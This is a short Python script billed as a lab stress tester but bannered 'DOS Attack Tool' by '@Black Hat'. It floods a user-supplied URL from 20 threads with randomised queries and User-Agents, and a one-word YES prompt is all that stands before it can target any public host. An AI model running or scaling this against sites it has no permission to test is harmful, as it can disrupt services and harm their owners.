# lab_stress.py — SIMPLE controlled stress tester (lab + authorized targets only)
import threading, time, random, socket, ipaddress, sys, requests, pyfiglet

# === Banner ===
banner = pyfiglet.figlet_format("DOS Attack Tool")
print(banner)
print("Made by @Black Hat for Lab Security Testing Only\n")

THREADS = 20
REQUESTS_PER_THREAD = 200


def is_private_ip(host):
    try:
        for r in socket.getaddrinfo(host, None):
            ip = r[4][0]
            if ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback:
                return True
        return False
    except Exception:
        return False


def worker(id, target):
    s = requests.Session()
    for i in range(REQUESTS_PER_THREAD):
        try:
            path = f"/?q={random.randint(1, 10000)}"
            headers = {"User-Agent": f"lab-agent-{random.randint(1, 999)}"}
            r = s.get(target + path, headers=headers, timeout=5)
            print(f"t{id} #{i} -> {r.status_code} len={len(r.content)}")
        except Exception as e:
            print(f"t{id} error: {e}")
        time.sleep(random.uniform(0.01, 0.2))


if __name__ == "__main__":
    target_input = input("Enter target URL (http://IP:port or http://domain): ").strip()
    host = target_input.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]

    # Safety check
    if not is_private_ip(host):
        print("\nWARNING: Target is not a private IP.")
        print("Only proceed if you have explicit permission from the owner!")
        confirm = input("Type YES to confirm you have authorization: ").strip()
        if confirm != "YES":
            print("Aborting. No authorization given.")
            sys.exit(1)

    threads = []
    for t in range(THREADS):
        th = threading.Thread(target=worker, args=(t, target_input), daemon=True)
        threads.append(th)
        th.start()

    try:
        while any(th.is_alive() for th in threads):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("Stopped by user.")
